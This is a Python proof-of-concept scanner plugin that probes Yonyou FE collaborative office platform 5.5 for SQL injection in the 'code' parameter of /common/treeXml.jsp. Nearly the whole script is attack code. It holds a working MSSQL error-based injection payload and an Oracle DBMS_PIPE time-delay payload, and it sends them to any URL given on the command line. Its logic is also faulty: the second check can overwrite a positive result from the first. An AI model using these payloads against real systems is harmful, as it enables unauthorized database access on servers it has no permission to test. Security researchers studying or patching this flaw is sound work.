#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友FE协作办公平台5.5 SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-086697
author: Lucifer
description: 文件/common/treeXml.jsp中,参数code存在SQL注入。
'''
import sys
import time
import requests
import warnings
def run(url):
        result = ['用友FE协作办公平台5.5 SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/common/treeXml.jsp?type=sort&lx=3&code=1%27AnD%201=ConVert(Int,Char(66)%2BChar(66)%2BChar(66)%2B@@Version)--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl

            vulnurl = url + "/common/treeXml.jsp?type=sort&lx=3&code=1%27%20AND%207491=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(65)||CHR(70)||CHR(70),6)%20AND%20%271%27=%271"
            start_time = time.time()
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    